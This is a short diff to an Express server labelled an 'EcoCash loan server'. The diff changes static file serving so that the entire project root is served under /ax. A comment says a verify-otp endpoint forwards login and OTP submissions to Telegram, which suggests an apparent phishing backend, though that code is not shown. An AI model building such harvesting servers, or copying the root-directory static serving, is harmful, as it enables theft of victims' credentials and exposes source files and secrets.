@@ -8,8 +8,8 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve all static frontend files (HTML, CSS, JS, images) under the /ax prefix
-app.use('/ax', express.static(path.join(__dirname, 'public')));
+// Serve static frontend files directly from the root directory under /ax
+app.use('/ax', express.static(path.join(__dirname)));
 
 // API endpoint for handling OTP verification / login submission and notifying Telegram
 app.post('/ax/api/verify-otp', async (req, res) => {
@@ -50,13 +50,12 @@ app.post('/ax/api/verify-otp', async (req, res) => {
     }
 });
 
-// Catch-all route to serve your frontend router / pages under /ax/
+// Catch-all route to serve index.html under /ax/
 app.get('/ax/*', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // Start the Express server
 app.listen(PORT, () => {
     console.log(`EcoCash loan server is running on port ${PORT}`);
 });
-                
